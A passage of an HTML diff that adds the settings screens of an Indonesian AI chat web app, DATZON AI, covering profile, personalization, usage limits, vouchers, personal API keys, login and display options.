+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><rect x="4" y="4" width="16" height="16" rx="3" stroke="currentColor" stroke-width="2"/><path d="M12 8v8M8 12h8" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            <span class="settings-row-text"><b>Limit Request Gratis</b><span>Misi iklan & sosial untuk voucher.</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M4 6h16v12H4V6Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="m4 7 8 6 8-6" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>
+            <span class="settings-row-text"><b>Email</b><span id="profileEmailLabel">datzon.user@example.com</span></span>
+          </button>
+        </div>
+<div class="settings-group">
+          <button class="settings-row" type="button" data-settings-open="general">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M12 15.5A3.5 3.5 0 1 0 12 8a3.5 3.5 0 0 0 0 7.5Z" stroke="currentColor" stroke-width="2"/><path d="M19 12h2M3 12h2M12 3v2M12 19v2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            <span class="settings-row-text"><b>Umum</b><span id="languageLabel">Indonesia</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="security">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M12 2 4 6v6c0 5 3.5 9 8 10 4.5-1 8-5 8-10V6l-8-4Z" stroke="currentColor" stroke-width="2"/><path d="M9 12l2 2 4-5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            <span class="settings-row-text"><b>Keamanan</b><span>Password lokal & sesi aktif.</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="storage">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><rect x="4" y="5" width="16" height="14" rx="3" stroke="currentColor" stroke-width="2"/><path d="M8 9h8M8 15h5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            <span class="settings-row-text"><b>Penyimpanan</b><span id="storageSummary">LocalStorage sementara.</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="report">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M12 9v4M12 17h.01" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/></svg>
+            <span class="settings-row-text"><b>Laporkan bug</b><span>Simpan laporan lokal / Firebase aktif.</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="about">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="M12 11v6M12 7h.01" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>
+            <span class="settings-row-text"><b>Tentang</b><span>DATZON AI V42</span></span>
+            <span class="settings-next">›</span>
+          </button>
+        </div>
+
+        <button class="settings-row settings-logout" type="button" id="profileLogoutBtn">
+          <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M10 17l5-5-5-5M15 12H3M21 3v18" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          <span class="settings-row-text"><b>Keluar</b></span>
+        </button>
+      </div>
+
+      <div class="settings-view" id="pagePersonalization">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Personalisasi</h2>
+          <button class="settings-save" type="button" data-save-settings aria-label="Simpan"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="m20 6-11 11-5-5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+        </div>
+
+        <div class="settings-group single">
+          <button class="settings-row has-popover" type="button" data-settings-pop="tone">
+            <span class="settings-row-text"><b>Gaya dan nada dasar</b><span id="toneLabel">Sinis</span></span>
+            <span class="settings-chevron">⌄</span>
+          </button>
+        </div>
+        <p class="settings-help">Ini gaya utama respons DATZON AI. Untuk sekarang disimpan lokal dulu, karena database belum ikut kerja rodi.</p>
+
+        <div class="settings-section-title">Karakteristik</div>
+        <div class="settings-group">
+          <button class="settings-row compact" type="button" data-settings-open="characteristics">
+            <span class="settings-row-text"><b id="warmSummary">Kurang hangat</b><span>Lebih profesional dan faktual</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row compact" type="button" data-settings-open="characteristics">
+            <span class="settings-row-text"><b id="enthusiasmSummary">Kurang antusias</b><span>Lebih tenang dan lebih netral</span></span>
+            <span class="settings-next">›</span>
+          </button>
+        </div>
+
+        <button class="settings-row standalone" type="button" data-settings-open="characteristics"><span class="settings-row-text"><b>Tambah karakteristik</b><span>Atur hangat, antusias, format, dan emoji.</span></span></button>
+        <p class="settings-help">Pilih beberapa penyesuaian tambahan selain gaya dan nada dasar.</p>
+
+        <div class="settings-group single">
+          <button class="settings-row switch-row" type="button" data-toggle-setting="quickAnswer">
+            <span class="settings-row-text"><b>Jawaban cepat</b><span>Respons lebih cepat, tapi tidak terlalu mendalam.</span></span>
+            <span class="switch" id="quickAnswerSwitch"><i></i></span>
+          </button>
+        </div>
+
+        <div class="settings-section-title">Instruksi khusus</div>
+        <textarea class="settings-textarea" id="customInstruction" placeholder="Bagikan hal lain yang perlu dipertimbangkan DATZON AI dalam responsnya."></textarea>
+      </div>
+
+      <div class="settings-view" id="pageCharacteristics">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="personalization" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Karakteristik</h2>
+          <span></span>
+        </div>
+        <div class="settings-group trait-group">
+          <button class="settings-row has-popover" type="button" data-trait="warm"><span class="settings-row-text"><b>Hangat</b><span id="traitWarmLabel">Lebih sedikit</span></span><span class="settings-chevron">⌄</span></button>
+          <button class="settings-row has-popover" type="button" data-trait="enthusiasm"><span class="settings-row-text"><b>Antusias</b><span id="traitEnthusiasmLabel">Lebih sedikit</span></span><span class="settings-chevron">⌄</span></button>
+          <button class="settings-row has-popover" type="button" data-trait="lists"><span class="settings-row-text"><b>Judul & Daftar</b><span id="traitListsLabel">Default</span></span><span class="settings-chevron">⌄</span></button>
+          <button class="settings-row has-popover" type="button" data-trait="emoji"><span class="settings-row-text"><b>Emoji</b><span id="traitEmojiLabel">Lebih sedikit</span></span><span class="settings-chevron">⌄</span></button>
+        </div>
+        <button class="settings-row settings-logout" type="button" id="resetTraits"><span class="settings-row-text"><b>Reset karakteristik</b></span></button>
+      </div>
+
+      <div class="settings-view" id="pageMemory">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Memori</h2>
+          <button class="settings-save" type="button" data-save-settings aria-label="Simpan"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="m20 6-11 11-5-5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+        </div>
+        <div class="settings-group single">
+          <button class="settings-row switch-row" type="button" data-toggle-setting="memory">
+            <span class="settings-row-text"><b>Aktifkan memori</b><span>Personalisasi lokal untuk obrolan DATZON.</span></span>
+            <span class="switch" id="memorySwitch"><i></i></span>
+          </button>
+        </div>
+        <p class="settings-help">Biarkan DATZON AI mengingat preferensi dari perangkat ini. Belum sinkron cloud, santai dulu, server belum diseret ke sini.</p>
+        <div class="settings-section-title">Nama panggilan Anda</div>
+        <input class="settings-input" id="memoryNickname" placeholder="Nama panggilan" />
+        <div class="settings-section-title">Pekerjaan Anda</div>
+        <input class="settings-input" id="memoryJob" placeholder="Insinyur, pelajar, kreator, dll." />
+        <div class="settings-section-title">Selengkapnya tentang Anda</div>
+        <textarea class="settings-textarea" id="memoryAbout" placeholder="Minat, nilai, atau preferensi yang perlu diingat"></textarea>
+      </div>
+
+      <div class="settings-view" id="pageProfilePhoto">
+        <div class="settings-sub-head photo-profile-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Photo Profile</h2>
+          <span></span>
+        </div>
+        <div class="profile-photo-page-card">
+          <div class="profile-photo-preview-wrap">
+            <div class="profile-photo-preview" id="profilePhotoPreview">DU</div>
+            <div class="profile-photo-page-loading" id="profilePhotoPageLoading"><span></span></div>
+          </div>
+          <h3 id="profilePhotoPageName">DATZON User</h3>
+          <p id="profilePhotoPageDesc">Foto profil disimpan ke Cloudinary. Guest menyimpan URL di localStorage, akun login menyimpan URL di Firebase.</p>
+          <div class="profile-photo-actions">
+            <button class="primary-wide" type="button" id="profilePhotoChangeBtn">Ganti Foto</button>
+            <button class="primary-wide secondary danger-soft" type="button" id="profilePhotoRemoveBtn">Hapus Foto</button>
+          </div>
+          <div class="settings-hint" id="profilePhotoStatus">Pilih gambar dari perangkat kamu.</div>
+        </div>
+      </div>
+
+      <div class="settings-view" id="pageCheckin">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Check in Harian</h2>
+          <span></span>
+        </div>
+        <p class="settings-help" id="checkinStatus">Login atau register dulu untuk check in harian dan menyimpan progress ke Firebase.</p>
+        <div class="checkin-grid" id="checkinGrid"></div>
+      </div>
+
+      <div class="settings-view" id="pageLimit">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Limit Request</h2>
+          <span></span>
+        </div>
+        <div class="limit-hero-card">
+          <div class="limit-hero-icon"><svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M4 19V5a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M7 17h10M8 8h8M8 12h5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M4 19c1.5-1.3 3-1.3 4.5 0s3 1.3 4.5 0 3-1.3 4.5 0 3 1.3 4.5 0" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg></div>
+          <b id="limitModeLabel">Guest Mode</b>
+          <span id="limitHeroText">Guest mendapat 20 Chat AI dan 5 Gambar AI. Login untuk tambah limit.</span>
+        </div>
+        <div class="limit-card">
+          <div class="limit-row-head"><b>Chat AI</b><span id="limitChatText">0 / 20</span></div>
+          <div class="limit-bar"><i id="limitChatBar"></i></div>
+          <p class="settings-help compact">Untuk ngobrol, menulis, ringkasan, codex, dan bantuan teks biasa.</p>
+        </div>
+        <div class="limit-card">
+          <div class="limit-row-head"><b>Gambar AI</b><span id="limitImageText">0 / 5</span></div>
+          <div class="limit-bar"><i id="limitImageBar"></i></div>
+          <p class="settings-help compact">Untuk generate gambar lewat provider gambar DATZON.</p>
+        </div>
+        <div class="limit-info-card">
+          <h3>Dapatkan limit request lebih banyak</h3>
+          <p>Register pengguna baru untuk mendapatkan limit gratis, lalu lakukan check in harian untuk bonus limit tambahan.</p>
+          <div class="limit-action-grid">
+            <button class="primary-wide secondary" type="button" data-settings-open="auth" data-auth-panel="register">Register</button>
+            <button class="primary-wide" type="button" data-settings-open="checkin">Check in Harian</button>
+            <button class="primary-wide secondary" type="button" data-settings-open="quota">Dapatkan Limit Gratis</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="settings-view" id="pageRank">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Rank</h2>
+          <span></span>
+        </div>
+        <div class="rank-showcase" id="rankShowcase">
+          <div class="rank-card" id="rankCard">
+            <div class="rank-emblem">IM</div>
+            <div><b id="rankTitle">Guest</b><p id="rankDesc">Rank aktif akan muncul di sini.</p></div>
+          </div>
+          <div class="rank-benefits" id="rankBenefits">
+            <b>Benefit Rank Immortal</b>
+            <span>Akses Chat AI tanpa limit</span>
+            <span>Akses Gambar AI tanpa limit</span>
+            <span>Prioritas fitur eksperimen DATZON</span>
+          </div>
+        </div>
+        <button class="danger-wide subtle" type="button" id="clearRankImmortalBtn" hidden>Hapus Rank Immortal aktif</button>
+        <p class="settings-help compact" id="clearRankStatus">Hapus rank hanya kalau kamu ingin reset status Immortal yang tersimpan lokal/Firebase.</p>
+      </div>
+
+      <div class="settings-view" id="pageRedeem">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Tukarkan Kode</h2>
+          <span></span>
+        </div>
+        <div class="redeem-card">
+          <label class="settings-section-title" for="redeemCodeInput">Kode voucher</label>
+          <input class="settings-input" id="redeemCodeInput" placeholder="DTZIMO-B8MQFU" autocomplete="off" />
+          <button class="primary-wide" type="button" id="redeemCheckBtn">Tukarkan</button>
+          <div id="redeemPreview" class="redeem-preview" hidden></div>
+        </div>
+      </div>
+
+      <div class="settings-view" id="pageOwnApiKeys">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>API Key Sendiri</h2>
+          <span></span>
+        </div>
+        <div class="security-card own-api-card">
+          <div class="security-card-head">
+            <b>Provider custom</b>
+            <span>Tambahkan API key pribadi untuk Mistral, Groq, atau Google Studio.</span>
+          </div>
+          <label class="settings-section-title" for="ownApiKeyProvider">Provider</label>
+          <select class="settings-input bug-type-select" id="ownApiKeyProvider">
+            <option value="googleStudio">Google Studio / Gemini</option>
+            <option value="mistral">Mistral</option>
+            <option value="groq">Groq</option>
+          </select>
+          <label class="settings-section-title" for="ownApiKeyName">Nama provider</label>
+          <input class="settings-input" id="ownApiKeyName" type="text" placeholder="Contoh: Google Studio 2" autocomplete="off" maxlength="40" />
+          <label class="settings-section-title" for="ownApiKeyValue">Kode API key</label>
+          <div class="password-field security-password-field">
+            <input class="settings-input" id="ownApiKeyValue" type="password" placeholder="Tempel API key di sini" autocomplete="off" />
+            <button class="password-eye" type="button" data-eye-target="ownApiKeyValue" aria-label="Tampilkan API key"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" stroke="currentColor" stroke-width="2"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/></svg></button>
+          </div>
+          <label class="settings-section-title" for="ownApiKeyStorage">Penyimpanan</label>
+          <select class="settings-input bug-type-select" id="ownApiKeyStorage">
+            <option value="local">LocalStorage perangkat ini</option>
+            <option value="cloud">Firebase akun login</option>
+          </select>
+          <div class="limit-action-grid api-key-link-grid">
+            <button class="primary-wide secondary" type="button" data-api-key-link="googleStudio">Ambil Google Studio</button>
+            <button class="primary-wide secondary" type="button" data-api-key-link="mistral">Ambil Mistral</button>
+            <button class="primary-wide secondary" type="button" data-api-key-link="groq">Ambil Groq</button>
+          </div>
+          <button class="primary-wide" type="button" id="saveOwnApiKeyBtn">Simpan API key</button>
+          <p class="settings-help compact" id="ownApiKeyStatus">API key pribadi hanya dipakai saat provider custom itu dipilih.</p>
+        </div>
+        <div class="settings-section-title">API key tersimpan</div>
+        <div class="settings-group" id="ownApiKeyList">
+          <button class="settings-row" type="button"><span class="settings-row-text"><b>Belum ada API key sendiri</b><span>Tambahkan API key untuk memunculkan provider pribadi.</span></span></button>
+        </div>
+      </div>
+
+      <div class="settings-view" id="pageQuota">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Limit Request Gratis</h2>
+          <span></span>
+        </div>
+        <div id="freeLimitPage" class="free-limit-page">
+          <div class="coming-card">
+            <div class="coming-badge">LOADING</div>
+            <h3>Menyiapkan misi limit gratis...</h3>
+            <p>Tunggu sebentar, DATZON lagi menyusun misi harian dan misi sekali.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="settings-view" id="pageAuth">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Login</h2>
+          <button class="settings-save" type="button" id="refreshDataBtn" aria-label="Refresh data"><svg width="23" height="23" viewBox="0 0 24 24" fill="none"><path d="M20 12a8 8 0 1 1-2.34-5.66M20 4v6h-6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+        </div>
+        <div class="auth-card auth-v23">
+          <div class="auth-userbox">
+            <div class="auth-avatar" id="authAvatarMini">DU</div>
+            <div>
+              <b id="authUserTitle">Guest mode</b>
+              <span id="authUserSub">Obrolan tersimpan di localStorage.</span>
+            </div>
+          </div>
+
+          <div class="auth-segment" id="authSegment" role="tablist" aria-label="Pilih halaman akun">
+            <button type="button" data-auth-tab="login" class="is-active" aria-selected="true">Login</button>
+            <button type="button" data-auth-tab="register" aria-selected="false">Register</button>
+          </div>
+
+          <div class="auth-panel is-active" data-auth-panel="login">
+            <div class="auth-tabs-title">Login</div>
+            <input class="settings-input" id="loginEmail" type="email" placeholder="email@domain.com" autocomplete="email" />
+            <div class="password-field">
+              <input class="settings-input" id="loginPassword" type="password" placeholder="Password minimal 6 karakter" autocomplete="current-password" />
+              <button class="password-eye" type="button" data-eye-target="loginPassword" aria-label="Tampilkan password"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" stroke="currentColor" stroke-width="2"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/></svg></button>
+            </div>
+            <button class="auth-reset-inline" type="button" id="authResetBtn">Kirim reset password</button>
+            <button class="primary-wide" type="button" id="emailLoginBtn">Masuk</button>
+            <button class="google-btn" type="button" id="googleLoginBtn">
+              <svg width="20" height="20" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84C6.71 7.31 9.14 5.38 12 5.38z"/></svg>
+              Lanjutkan dengan Google
+            </button>
+            <p class="auth-switch-note">Belum punya akun? <button type="button" data-auth-tab="register">Daftar di sini</button></p>
+          </div>
+
+          <div class="auth-panel" data-auth-panel="register">
+            <div class="auth-tabs-title">Register</div>
+            <input class="settings-input" id="regName" type="text" placeholder="Nama tampilan" autocomplete="name" />
+            <input class="settings-input" id="regEmail" type="email" placeholder="email@domain.com" autocomplete="email" />
+            <div class="password-field">
+              <input class="settings-input" id="regPassword" type="password" placeholder="Password minimal 6 karakter" autocomplete="new-password" />
+              <button class="password-eye" type="button" data-eye-target="regPassword" aria-label="Tampilkan password"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" stroke="currentColor" stroke-width="2"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/></svg></button>
+            </div>
+            <div class="password-field">
+              <input class="settings-input" id="regConfirm" type="password" placeholder="Konfirmasi password" autocomplete="new-password" />
+              <button class="password-eye" type="button" data-eye-target="regConfirm" aria-label="Tampilkan konfirmasi password"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" stroke="currentColor" stroke-width="2"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/></svg></button>
+            </div>
+            <button class="primary-wide" type="button" id="emailRegisterBtn">Register</button>
+            <button class="google-btn" type="button" id="googleRegisterBtn">
+              <svg width="20" height="20" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84C6.71 7.31 9.14 5.38 12 5.38z"/></svg>
+              Lanjutkan dengan Google
+            </button>
+            <p class="auth-switch-note">Sudah punya akun? <button type="button" data-auth-tab="login">Login di sini</button></p>
+          </div>
+
+          <div class="auth-panel" data-auth-panel="complete-google">
+            <div class="auth-tabs-title">Lengkapi Akun</div>
+            <div class="google-complete-head">
+              <div class="auth-avatar" id="googleCompleteAvatar">G</div>
+              <div><b id="googleCompleteEmail">Akun Google</b><span>Lengkapi data sekali saja sebelum akun DATZON dibuat.</span></div>
+            </div>
+            <input class="settings-input" id="googleRegName" type="text" placeholder="Nama tampilan" autocomplete="name" />
+            <div class="password-field">
+              <input class="settings-input" id="googleRegPassword" type="password" placeholder="Password minimal 6 karakter" autocomplete="new-password" />
+              <button class="password-eye" type="button" data-eye-target="googleRegPassword" aria-label="Tampilkan password"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" stroke="currentColor" stroke-width="2"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/></svg></button>
+            </div>
+            <div class="password-field">
+              <input class="settings-input" id="googleRegConfirm" type="password" placeholder="Konfirmasi password" autocomplete="new-password" />
+              <button class="password-eye" type="button" data-eye-target="googleRegConfirm" aria-label="Tampilkan konfirmasi password"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" stroke="currentColor" stroke-width="2"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/></svg></button>
+            </div>
+            <button class="primary-wide" type="button" id="googleCompleteRegisterBtn">Register</button>
+          </div>
+          <button class="danger-wide subtle" type="button" id="authLogoutBtn" hidden>Keluar akun</button>
+          <p class="settings-help compact auth-status" id="authStatus"></p>
+        </div>
+      </div>
+
+      <div class="settings-view" id="pageNotes">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Catatan</h2>
+          <button class="settings-save" type="button" id="refreshNotesBtn" aria-label="Refresh catatan"><svg width="23" height="23" viewBox="0 0 24 24" fill="none"><path d="M20 12a8 8 0 1 1-2.34-5.66M20 4v6h-6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+        </div>
+        <div class="notes-card">
+          <div class="notes-search">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="m21 21-4.3-4.3M11 19a8 8 0 1 1 0-16 8 8 0 0 1 0 16Z" stroke="currentColor" stroke-width="2.1" stroke-linecap="round"/></svg>
+            <input id="notesSearchInput" type="search" placeholder="Cari catatan..." autocomplete="off" />
+          </div>
+          <div class="notes-list" id="notesList"></div>
+          <div class="notes-empty" id="notesEmpty">Belum ada catatan. Simpan jawaban dari menu titik tiga dulu, wah sebuah konsep.</div>
+        </div>
+      </div>
+
+      <div class="settings-view" id="pageDisplay">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Tampilan</h2>
+          <span></span>
+        </div>
+        <div class="settings-section-title">Ukuran teks bubble chat</div>
+        <div class="settings-group display-size-group">
+          <button class="settings-row display-size-option" type="button" data-chat-size="small"><span class="settings-row-text"><b>Kecil</b><span>Lebih rapat, hemat layar HP.</span></span><span class="check-slot"></span></button>
+          <button class="settings-row display-size-option" type="button" data-chat-size="normal"><span class="settings-row-text"><b>Normal</b><span>Ukuran bawaan yang waras.</span></span><span class="check-slot"></span></button>
+          <button class="settings-row display-size-option" type="button" data-chat-size="large"><span class="settings-row-text"><b>Besar</b><span>Lebih gampang dibaca, layar agak boros.</span></span><span class="check-slot"></span></button>
+          <button class="settings-row display-size-option" type="button" data-chat-size="xlarge"><span class="settings-row-text"><b>Jumbo</b><span>Buat mata yang sudah capek lihat bug CSS.</span></span><span class="check-slot"></span></button>
+        </div>
+        <div class="display-preview-card">
+          <div class="display-preview-title">Preview</div>
+          <div class="display-preview-bubbles">
+            <div class="display-preview-user">Ini contoh teks kamu.</div>
+            <div class="display-preview-ai">Ini contoh teks DATZON AI. Ukuran bubble bakal ikut setelan ini, bukan ngikut mood browser.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="settings-view" id="pageGeneral">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Umum</h2>
+          <span></span>
+        </div>
+        <div class="settings-section-title">Bahasa</div>
+        <div class="settings-group">
+          <button class="settings-row lang-option" type="button" data-language="Indonesia"><span class="settings-row-text"><b>Indonesia</b><span>Default untuk DATZON AI.</span></span><span class="check-slot"></span></button>
+          <button class="settings-row lang-option" type="button" data-language="English"><span class="settings-row-text"><b>English</b><span>Terjemahkan seluruh UI ke English.</span></span><span class="check-slot"></span></button>
+        </div>
+        <p class="settings-help">Pilih bahasa untuk menerjemahkan seluruh tampilan DATZON AI.</p>
+      </div>
+
+
+      <div class="settings-view" id="pageSecurity">
+        <div class="settings-sub-head">
+          <button class="settings-back sub-back" type="button" data-settings-open="home" aria-label="Kembali"><svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+          <h2>Keamanan</h2>
+          <span></span>
+        </div>
+        <div class="settings-section-title">Masuk</div>
+        <div class="security-card">
+          <div class="security-card-head">
+            <b>Reset password lewat email</b>
+            <span>Siap disambung Firebase Auth.</span>
+          </div>
+          <div class="inline-form">
+            <input class="settings-input" id="resetEmailInput" type="email" placeholder="email@domain.com" autocomplete="email" />
+            <button class="small-action" type="button" id="sendResetBtn">Kirim reset</button>
+          </div>
+          <p class="settings-help compact" id="resetStatus">Belum ada reset password dikirim.</p>
+        </div>
+        <div class="settings-section-title">Ganti password lokal</div>
+        <div class="security-card">
+          <div class="password-field security-password-field">
